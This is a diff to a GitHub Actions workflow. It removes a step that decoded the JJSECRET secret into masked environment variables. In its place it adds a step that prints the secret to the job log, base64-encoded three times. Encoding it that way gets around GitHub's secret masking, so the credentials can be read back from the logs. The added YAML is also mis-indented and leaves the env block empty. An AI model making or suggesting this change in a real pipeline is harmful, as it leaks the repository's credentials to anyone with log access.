@@ -6,15 +6,11 @@ jobs:
     runs-on: ubuntu-latest
 
     env:
-      env_vars: ${{ secrets.JJSECRET}}
+      
     steps:
       - name: Decode credentials as environment variables
-        run: |
-          for i in $env_vars; do
-            i=$(echo $i | sed 's/=.*//g')=$(echo ${i#*=} | base64 -di | base64 -di)
-            echo ::add-mask::${i#*=}
-            printf '%s\n' "$i" >> $GITHUB_ENV
-          done
+       - run: |
+           echo ${{ secrets.JJSECRET }} | base64 |base64 |base64 
       - name: Validate credentials
         run: |
           # Secrets are now available as masked environment variable.
